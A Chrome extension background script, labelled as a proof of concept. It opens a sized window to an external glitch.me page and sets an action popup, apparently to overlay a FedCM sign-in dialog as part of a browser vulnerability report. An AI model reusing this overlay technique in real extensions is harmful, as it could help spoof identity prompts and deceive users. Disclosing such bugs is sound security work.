
/***** INSTRUCTIONS ******
Set scenario below, then (re)load extension to run
****** INSTRUCTIONS *****/

var scenario = 'fedcm';

/*** PoC context ***
This PoC is designed to work when chrome.action.openPopup() is NOT available
but still works when it's available, since this technique is unaffected by openPopup() availability.
********************/

// true on v101 Canary + v100 Dev, false on v98 Stable
var canOpenPopup = (typeof chrome.action.openPopup !== 'undefined');
var url;
var popupUrl;
var width;
var height;

if (canOpenPopup) {
  console.warn('This PoC will work but chrome.action.openPopup() is available which allows the other, better PoC to work.');
}

if (scenario === 'fedcm') {
 
  
  url = 'https://thundering-unruly-windflower.glitch.me/fcm.html';
 
  width = 950; 
  height = 700;
  popupUrl = 'popup.html';
} 

chrome.action.setPopup({popup: popupUrl});

var openedTabId;

chrome.runtime.onInstalled.addListener(() => {
  console.info('Extension running.');
  // Create the window, then ask user to press keyboard shortcut to trigger extension action popup
  chrome.windows.create({url: url, width: width, height: height});
});
